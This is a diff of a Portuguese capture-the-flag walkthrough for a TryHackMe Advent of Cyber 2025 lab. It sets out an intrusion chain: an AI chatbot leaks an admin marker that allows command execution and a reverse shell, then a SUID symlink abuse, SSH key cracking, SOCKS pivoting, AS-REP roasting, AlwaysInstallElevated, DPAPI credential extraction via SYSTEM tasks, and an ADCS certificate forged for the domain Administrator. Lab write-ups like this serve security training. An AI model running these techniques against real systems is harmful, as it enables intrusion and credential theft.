@@ -2,7 +2,7 @@
 
 Este guia acompanha a sala [Hopper's Origin](https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX), da série Advent of Cyber 2025. O objetivo é alcançar os servidores e os três domínios do mapa, ler os arquivos `user.txt` e `root.txt` e enviar as 17 flags no painel da sala. As respostas abaixo são apenas máscaras; leia cada arquivo no laboratório para obter o valor completo.
 
-Use uma máquina Kali conectada à VPN da **Side Quest**. Os IPs do exemplo vieram de uma instância e devem ser substituídos pelos que aparecerem no mapa da sua rede. Guarde senhas, hashes, chaves e tickets em um diretório privado fora de um repositório público.
+Para seguir o guia, use uma máquina de ataque com acesso à rede da **Side Quest**. Recomendo uma Kali local conectada à VPN da Side Quest: os comandos, arquivos e ferramentas instaladas permanecem disponíveis entre sessões, mesmo que o tempo da sala ou da máquina de ataque termine. Você também pode usar a **AttackBox do próprio TryHackMe**; nesse caso, confirme que ela está conectada à rede da Side Quest antes de executar os comandos. Uma AttackBox não persistente pode expirar e perder o trabalho salvo nela. No plano MAX, a [Persistent AttackBox](https://help.tryhackme.com/en/articles/6721845-the-attackbox-explained) retoma os arquivos e as ferramentas de sessões anteriores. Os IPs do exemplo vieram de uma instância e devem ser substituídos pelos que aparecerem no mapa da sua rede. Guarde senhas, hashes, chaves e tickets em um diretório privado fora de um repositório público.
 
 ## 1. Reconhecimento e preparação
 
@@ -23,7 +23,7 @@ O DB fornece o primeiro pivô para a rede interna. Depois dele, use SOCKS para f
 
 ## 2. WEB - acesso inicial
 
-Inspecione o chatbot em `http://<WEB>/`. Uma solicitação de diagnóstico que pede a configuração interna revela o marcador de administração e a ação `SOC_ADMIN_EXECUTE_COMMAND:`. O endpoint `/api/chat` aceita essa combinação. Confirme com um comando inofensivo como `id` e só então abra uma conexão de retorno para a Kali.
+Inspecione o chatbot em `http://<WEB>/`. Uma solicitação de diagnóstico que pede a configuração interna revela o marcador de administração e a ação `SOC_ADMIN_EXECUTE_COMMAND:`. O endpoint `/api/chat` aceita essa combinação. Confirme com um comando inofensivo como `id` e só então abra uma conexão de retorno para sua máquina de ataque.
 
 ```bash
 curl -s "http://$WEB/" -o web.html
@@ -49,7 +49,7 @@ Resposta: `THM{82f...}`
 
 ### WEB - elevação para root
 
-Procure binários SUID e examine `/usr/local/bin/patch_note`. Ele escreve uma nota no arquivo `/home/web/chatbot/changelog` com privilégios de root. O caminho é manipulável pelo usuário WEB. Gere um par de chaves **novo** na Kali, copie somente a chave pública para o shell WEB, substitua `changelog` por um link simbólico para `/root/.ssh/authorized_keys` e entregue a chave pública ao programa. Conecte-se por SSH como root e leia a flag.
+Procure binários SUID e examine `/usr/local/bin/patch_note`. Ele escreve uma nota no arquivo `/home/web/chatbot/changelog` com privilégios de root. O caminho é manipulável pelo usuário WEB. Gere um par de chaves **novo** na máquina de ataque, copie somente a chave pública para o shell WEB, substitua `changelog` por um link simbólico para `/root/.ssh/authorized_keys` e entregue a chave pública ao programa. Conecte-se por SSH como root e leia a flag.
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
@@ -66,7 +66,7 @@ Resposta: `THM{583...}`
 
 ## 3. DB - chave protegida e pivô SSH
 
-Na WEB, uma chave SSH privada de root possui passphrase. Copie-a para a Kali sem mudar o arquivo original. `ssh2john` mais `john` identifica a passphrase da chave; retire-a apenas da cópia para automatizar o acesso ao DB. Entre no serviço SSH do DB como `socbot3000`. No primeiro acesso, o serviço pede um alias e devolve outra chave SSH. Salve essa chave com permissão `600`; o alias escolhido é o novo usuário do DB.
+Na WEB, uma chave SSH privada de root possui passphrase. Copie-a para a máquina de ataque sem mudar o arquivo original. `ssh2john` mais `john` identifica a passphrase da chave; retire-a apenas da cópia para automatizar o acesso ao DB. Entre no serviço SSH do DB como `socbot3000`. No primeiro acesso, o serviço pede um alias e devolve outra chave SSH. Salve essa chave com permissão `600`; o alias escolhido é o novo usuário do DB.
 
 ```bash
 ssh2john web_id_ed25519 > web_key.hash
@@ -82,7 +82,7 @@ cat /user.txt
 
 Resposta: `THM{114...}`
 
-Mantenha um túnel SOCKS e configure `proxychains4` com `socks5 127.0.0.1 1080`. Teste o acesso à primeira máquina Windows sem usar a AttackBox da plataforma.
+Mantenha um túnel SOCKS e configure `proxychains4` com `socks5 127.0.0.1 1080`. Teste o acesso à primeira máquina Windows a partir da máquina de ataque escolhida.
 
 ```bash
 ssh -N -D 127.0.0.1:1080 -i db_access.key \
@@ -94,7 +94,7 @@ proxychains4 -q nmap -sT -Pn -n -p 80,3389,5985 "$SERVER1"
 
 Abra a aplicação de teste de impressora do SERVER1. Seu formulário chama `/api/test` e recebe o endereço de um servidor LDAP. Prepare um listener no DB em uma porta de teste, informe `DB:PORTA` no formulário e observe a credencial de bind LDAP enviada pela aplicação. Ela pertence a `anne.clark` no domínio `ai.vanchat.loc`.
 
-Com essa conta, consulte o controlador `.122` em busca de contas sem pré-autenticação Kerberos. O AS-REP de `qw2.amy.young` pode ser quebrado com a lista de palavras da Kali. Use a senha descoberta para entrar no SERVER1 por WinRM e ler `C:\user.txt`.
+Com essa conta, consulte o controlador `.122` em busca de contas sem pré-autenticação Kerberos. O AS-REP de `qw2.amy.young` pode ser quebrado com uma lista de palavras disponível na máquina de ataque. Use a senha descoberta para entrar no SERVER1 por WinRM e ler `C:\user.txt`.
 
 ```bash
 proxychains4 -q nxc ldap "$DC1" -u anne.clark -p '<SENHA_DO_BIND>' \
@@ -108,7 +108,7 @@ Resposta: `THM{20f...}`
 
 ### SERVER1 - AlwaysInstallElevated
 
-Encaminhe RDP pelo DB para trabalhar na sessão de Amy. Verifique as duas chaves `AlwaysInstallElevated` em HKCU e HKLM; ambas precisam valer `1`. Um MSI preparado na Kali pode criar uma conta administrativa **temporária no laboratório** quando executado nessa sessão. Conecte-se com a conta criada, eleve o PowerShell e leia a flag do administrador.
+Encaminhe RDP pelo DB para trabalhar na sessão de Amy. Verifique as duas chaves `AlwaysInstallElevated` em HKCU e HKLM; ambas precisam valer `1`. Um MSI preparado na máquina de ataque pode criar uma conta administrativa **temporária no laboratório** quando executado nessa sessão. Conecte-se com a conta criada, eleve o PowerShell e leia a flag do administrador.
 
 ```bash
 ssh -N -L 127.0.0.1:13389:"$SERVER1":3389 \
@@ -138,7 +138,7 @@ Resposta: `THM{d93...}`
 
 ## 5. SERVER2 - DPAPI e SeDebugPrivilege
 
-No SERVER1 como administrador local, `SharpDPAPI.exe machinetriage` precisa do contexto SYSTEM para abrir os segredos de máquina. Crie uma tarefa agendada curta nesse contexto, grave a saída em um arquivo local e procure a credencial de `AI\qw1.brian.singh`. Remova a tarefa depois de copiar a credencial para um arquivo privado da Kali. A conta Brian abre WinRM no SERVER2 `.102`.
+No SERVER1 como administrador local, `SharpDPAPI.exe machinetriage` precisa do contexto SYSTEM para abrir os segredos de máquina. Crie uma tarefa agendada curta nesse contexto, grave a saída em um arquivo local e procure a credencial de `AI\qw1.brian.singh`. Remova a tarefa depois de copiar a credencial para um arquivo privado da máquina de ataque. A conta Brian abre WinRM no SERVER2 `.102`.
 
 ```powershell
 schtasks /Create /TN dpapiAudit /SC ONCE /ST 23:59 /RU SYSTEM /TR 'cmd.exe /c C:\ProgramData\SharpDPAPI.exe machinetriage > C:\ProgramData\dpapiSystem.txt 2>&1' /F
@@ -311,7 +311,7 @@ Start-ScheduledTask -TaskName 'InscricaoTBFC'
 Get-Content C:\ProgramData\hopper-template-acl-result.txt
 ```
 
-O [script original desta sala](scripts/gerar_csr_tbfc.py) gera uma CSR com UPN e SID do Administrator do domínio TBFC. Descubra o SID no LDAP do domínio e use-o no comando. Copie a CSR ao SERVER4, envie-a à CA pelo `certreq` como SYSTEM e recupere o certificado emitido. A chave privada permanece na Kali.
+O [script original desta sala](scripts/gerar_csr_tbfc.py) gera uma CSR com UPN e SID do Administrator do domínio TBFC. Descubra o SID no LDAP do domínio e use-o no comando. Copie a CSR ao SERVER4, envie-a à CA pelo `certreq` como SYSTEM e recupere o certificado emitido. A chave privada permanece na máquina de ataque.
 
 ```bash
 python3 scripts/gerar_csr_tbfc.py --sid '<SID_TBFC_ADMINISTRATOR>' \
@@ -324,7 +324,7 @@ certreq.exe -submit -q -config 'TBFC-DC1.tbfc.loc\TBFC-CA' -attrib 'CertificateT
 ```
 
 ```bash
-# Depois de baixar tbfc-admin.cer para a Kali:
+# Depois de baixar tbfc-admin.cer para a máquina de ataque:
 openssl pkcs12 -export -inkey tbfc-admin.key -in tbfc-admin.cer \
   -out tbfc-admin.pfx -passout pass:
 ```
